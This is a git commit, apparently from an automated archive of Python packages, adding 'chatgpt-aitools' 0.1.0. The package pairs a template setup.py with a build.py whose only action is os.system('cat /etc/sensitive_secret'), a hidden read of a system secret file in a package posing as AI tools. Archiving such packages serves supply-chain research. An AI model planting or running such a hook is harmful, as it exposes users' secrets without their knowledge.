01d342d9e4c5eaef5d538df2d7bbc53dd8f24904
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-30 15:05:38 +0000

    Add package chatgpt-aitools/0.1.0/chatgpt_aitools-0.1.0.tar.gz

---
+++ packages/chatgpt-aitools/chatgpt_aitools-0.1.0.tar.gz/chatgpt_aitools-0.1.0/chatgpt_aitools/build.py
@@ -0,0 +1,4 @@
+import os
+
+os.system("cat /etc/sensitive_secret")
+
---
+++ packages/chatgpt-aitools/chatgpt_aitools-0.1.0.tar.gz/chatgpt_aitools-0.1.0/setup.py
@@ -0,0 +1,17 @@
+from setuptools import setup, find_packages
+
+setup(
+    name="chatgpt_aitools",
+    version="0.1.0",
+    author="chatgpt_aitools",
+    description="Short description of your package",
+    long_description=open("README.md").read(),
+    long_description_content_type="text/markdown",
+    packages=find_packages(),
+    install_requires=[],
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+    ],
+    python_requires=">=3.6",
+)
